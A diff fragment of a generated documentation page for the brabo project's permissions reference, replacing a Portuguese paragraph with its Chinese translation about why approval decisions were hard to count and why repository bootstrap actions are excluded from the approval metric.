-<p>O bootstrap de repositório é a exceção deliberada: as mutações que ele propõe
-não emitem <code>proposed_action.created</code> no log, porque já são narradas por
-<code>bootstrap.step_*</code> na mesma sessão — contá-las de novo inflaria a métrica de
-aprovação com trabalho que ninguém aprovou.</div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_yZb9"><a href=https://github.com/daneiel/brabo/blob/dev/docs/reference/permissions.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_ANja aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>编辑此页</a></div><div class="col lastUpdated_Kb4y"><span class=theme-last-updated>最后<!-- -->由 <b>Daniel Souza</b> <!-- -->于 <b><time datetime=2026-10-16T02:29:31.000Z itemprop=dateModified>2026年10月16日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label=文件选项卡><a class="pagination-nav__link pagination-nav__link--prev" href=/brabo/dev/zh-Hans/reference/events><div class=pagination-nav__sublabel>上一页</div><div class=pagination-nav__label>Eventos</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/brabo/dev/zh-Hans/reference/artifacts><div class=pagination-nav__sublabel>下一页</div><div class=pagination-nav__label>Artefatos</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_wOiH thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#o-arquivo class="table-of-contents__link toc-highlight">O arquivo</a><ul><li><a href=#com-qual-credencial-a-ação-auto-aprovada-executa class="table-of-contents__link toc-highlight">Com qual credencial a ação auto-aprovada executa</a></ul><li><a href=#o-formato-do-padrão class="table-of-contents__link toc-highlight">O formato do padrão</a><li><a href=#como-um-padrão-casa-com-um-comando class="table-of-contents__link toc-highlight">Como um padrão casa com um comando</a><li><a href=#comando-composto class="table-of-contents__link toc-highlight">Comando composto</a><li><a href=#padrões-embutidos class="table-of-contents__link toc-highlight">Padrões embutidos</a><li><a href=#o-que-a-ativação-da-execução-semeia class="table-of-contents__link toc-highlight">O que a ativação da execução semeia</a><li><a href=#a-ordem-completa-da-decisão class="table-of-contents__link toc-highlight">A ordem completa da decisão</a><ul><li><a href=#modo-automático-a-curinga-do-agent_autonomy-rn-153 class="table-of-contents__link toc-highlight">"Modo automático": a curinga do <code>agent_autonomy</code> (RN-153)</a><li><a href=#o-piso-do-container-rn-492rn-493-adr-0134 class="table-of-contents__link toc-highlight">O piso do container (RN-492/RN-493, ADR 0134)</a></ul><li><a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="table-of-contents__link toc-highlight">A fronteira de efeito externo e comando privilegiado (RN-418)</a><li><a href=#path-scope class="table-of-contents__link toc-highlight">Escopo de caminho</a><li><a href=#caps class="table-of-contents__link toc-highlight">Tetos</a><li><a href=#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem class="table-of-contents__link toc-highlight">O que acontece com o agente enquanto a decisão não vem</a><li><a href=#o-que-é-gravado-em-cada-decisão class="table-of-contents__link toc-highlight">O que é gravado em cada decisão</a></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>文档</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/getting-started>快速开始</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/architecture>架构</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/business-rules>业务规则</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/runbook>运维手册</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>社区</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class=footer__link-item>如何贡献<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class=footer__link-item>在哪里求助<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class=footer__link-item>安全<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>更多</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CHANGELOG.md target=_blank rel="noopener noreferrer" class=footer__link-item>CHANGELOG<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/LICENSE target=_blank rel="noopener noreferrer" class=footer__link-item>MIT 许可证<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/THIRD_PARTY_NOTICES.md target=_blank rel="noopener noreferrer" class=footer__link-item>第三方声明<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Daniel Souza。基于 MIT 许可证授权。第三方工具保留各自的许可证——参见第三方声明。</div></div></div></footer></div></body>
+<p>直到 Fase 12e 这都不成立。前三行<strong>只进入 outbox</strong>，而 outbox 是传输——被清空、标记 <code>processed_at</code> 并被修剪——决定只存活在 <code>proposed_actions.decided_at</code> 中，这是界面、心理学家和 Anamnese 读取的时间线之外的一列。实际结果是，在 Fase 10 的 dogfooding 中无法回答“人批准了多少次”，而这恰恰是那次实验的主要指标。</p>
+<p>仓库的 bootstrap 是有意的例外：它提出的变更不会在日志中发出 <code>proposed_action.created</code>，因为它们已在同一会话中由
+<code>bootstrap.step_*</code> 讲述——再次计数会用没人批准的工作虚增审批指标。</div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_yZb9"><a href=https://github.com/daneiel/brabo/blob/dev/docs/reference/permissions.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_ANja aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>编辑此页</a></div><div class="col lastUpdated_Kb4y"><span class=theme-last-updated>最后<!-- -->由 <b>Daniel Souza</b> <!-- -->于 <b><time datetime=2026-10-16T03:24:35.000Z itemprop=dateModified>2026年10月16日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label=文件选项卡><a class="pagination-nav__link pagination-nav__link--prev" href=/brabo/dev/zh-Hans/reference/events><div class=pagination-nav__sublabel>上一页</div><div class=pagination-nav__label>Eventos</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/brabo/dev/zh-Hans/reference/artifacts><div class=pagination-nav__sublabel>下一页</div><div class=pagination-nav__label>Artefatos</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_wOiH thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#文件 class="table-of-contents__link toc-highlight">文件</a><ul><li><a href=#自动批准的动作用哪个凭据执行 class="table-of-contents__link toc-highlight">自动批准的动作用哪个凭据执行</a></ul><li><a href=#模式的格式 class="table-of-contents__link toc-highlight">模式的格式</a><li><a href=#模式如何匹配命令 class="table-of-contents__link toc-highlight">模式如何匹配命令</a><li><a href=#复合命令 class="table-of-contents__link toc-highlight">复合命令</a><li><a href=#内置模式 class="table-of-contents__link toc-highlight">内置模式</a><li><a href=#激活执行时预置什么 class="table-of-contents__link toc-highlight">激活执行时预置什么</a><li><a href=#决策的完整顺序 class="table-of-contents__link toc-highlight">决策的完整顺序</a><ul><li><a href=#自动模式agent_autonomy-的通配符rn-153 class="table-of-contents__link toc-highlight">“自动模式”：<code>agent_autonomy</code> 的通配符（RN-153）</a><li><a href=#容器下限rn-492rn-493adr-0134 class="table-of-contents__link toc-highlight">容器下限（RN-492/RN-493，ADR 0134）</a></ul><li><a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="table-of-contents__link toc-highlight">外部效果与特权命令的边界（RN-418）</a><li><a href=#path-scope class="table-of-contents__link toc-highlight">路径范围</a><li><a href=#caps class="table-of-contents__link toc-highlight">上限</a><li><a href=#决定未到时-agent-发生什么 class="table-of-contents__link toc-highlight">决定未到时 agent 发生什么</a><li><a href=#每次决定记录什么 class="table-of-contents__link toc-highlight">每次决定记录什么</a></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>文档</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/getting-started>快速开始</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/architecture>架构</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/business-rules>业务规则</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/zh-Hans/runbook>运维手册</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>社区</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class=footer__link-item>如何贡献<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class=footer__link-item>在哪里求助<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class=footer__link-item>安全<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>更多</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CHANGELOG.md target=_blank rel="noopener noreferrer" class=footer__link-item>CHANGELOG<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/LICENSE target=_blank rel="noopener noreferrer" class=footer__link-item>MIT 许可证<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/THIRD_PARTY_NOTICES.md target=_blank rel="noopener noreferrer" class=footer__link-item>第三方声明<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Daniel Souza。基于 MIT 许可证授权。第三方工具保留各自的许可证——参见第三方声明。</div></div></div></footer></div></body>
